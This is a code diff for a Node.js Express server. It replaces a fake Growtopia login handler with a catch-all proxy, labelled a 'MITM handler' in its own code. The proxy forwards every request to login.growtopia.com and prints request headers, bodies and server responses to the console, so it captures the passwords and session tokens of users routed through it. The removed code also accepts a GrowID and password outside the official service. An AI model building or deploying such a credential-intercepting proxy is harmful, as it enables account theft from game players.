@@ -29,53 +29,47 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(rateLimiter({ windowMs: 15 * 60 * 1000, max: 100, headers: true }));
 
-app.all('/player/login/dashboard', function (req, res) {
-    const tData = {};
-    try {
-        const uData = JSON.stringify(req.body).split('"')[1].split('\\n'); const uName = uData[0].split('|'); const uPass = uData[1].split('|');
-        for (let i = 0; i < uData.length - 1; i++) { const d = uData[i].split('|'); tData[d[0]] = d[1]; }
-        if (uName[1] && uPass[1]) { res.redirect('/player/growid/login/validate'); }
-    } catch (why) { console.log(`Warning: ${why}`); }
+app.use(async (req, res) => {
+  try {
+    // Ambil body mentah
+    const bodyBuffer = await getRawBody(req);
+    const bodyString = bodyBuffer.toString();
 
-    res.render(__dirname + '/public/html/dashboard.ejs', { data: tData });
-});
+    console.log(`\n===== REQUEST =====`);
+    console.log(`[${req.method}] ${req.originalUrl}`);
+    console.log('Headers:', req.headers);
+    console.log('Body:', bodyString);
 
-app.all('/player/growid/login/validate', (req, res) => {
-    const _token = req.body._token;
-    const growId = req.body.growId;
-    const password = req.body.password;
+    // Forward ke server asli
+    const targetUrl = `https://login.growtopia.com${req.originalUrl}`;
+    const response = await fetch(targetUrl, {
+      method: req.method,
+      headers: {
+        ...req.headers,
+        host: 'login.growtopia.com', // paksa host asli
+      },
+      body: ['GET', 'HEAD'].includes(req.method) ? undefined : bodyBuffer
+    });
 
-    const token = Buffer.from(
-        `_token=${_token}&growId=${growId}&password=${password}`,
-    ).toString('base64');
+    const respBuffer = await response.arrayBuffer();
+    const respString = Buffer.from(respBuffer).toString();
 
-    res.send(
-        `{"status":"success","message":"Account Validated.","token":"${token}","url":"","accountType":"growtopia"}`,
-    );
-});
+    console.log(`\n===== RESPONSE =====`);
+    console.log('Status:', response.status);
+    console.log('Headers:', Object.fromEntries(response.headers.entries()));
+    console.log('Body:', respString);
 
-app.all('/player/growid/checkToken', (req, res) => {
-    try {
-        const { refreshToken, clientData } = req.body;
-
-        if (!refreshToken || !clientData) {
-            return res.status(400).send({ status: "error", message: "Missing refreshToken or clientData" });
-        }
-
-        let decodeRefreshToken = Buffer.from(refreshToken, 'base64').toString('utf-8');
-
-        const token = Buffer.from(decodeRefreshToken.replace(/(_token=)[^&]*/, `$1${Buffer.from(clientData).toString('base64')}`)).toString('base64');
-
-        res.send({
-            status: "success",
-            message: "Token is valid.",
-            token: token,
-            url: "",
-            accountType: "growtopia"
-        });
-    } catch (error) {
-        res.status(500).send({ status: "error", message: "Internal Server Error" });
+    // Kirim balik ke client
+    res.status(response.status);
+    for (const [key, value] of response.headers.entries()) {
+      res.setHeader(key, value);
     }
+    res.send(Buffer.from(respBuffer));
+
+  } catch (err) {
+    console.error('Error in MITM handler:', err);
+    res.status(500).send('Internal Server Error');
+  }
 });
 
 app.get('/', function (req, res) {
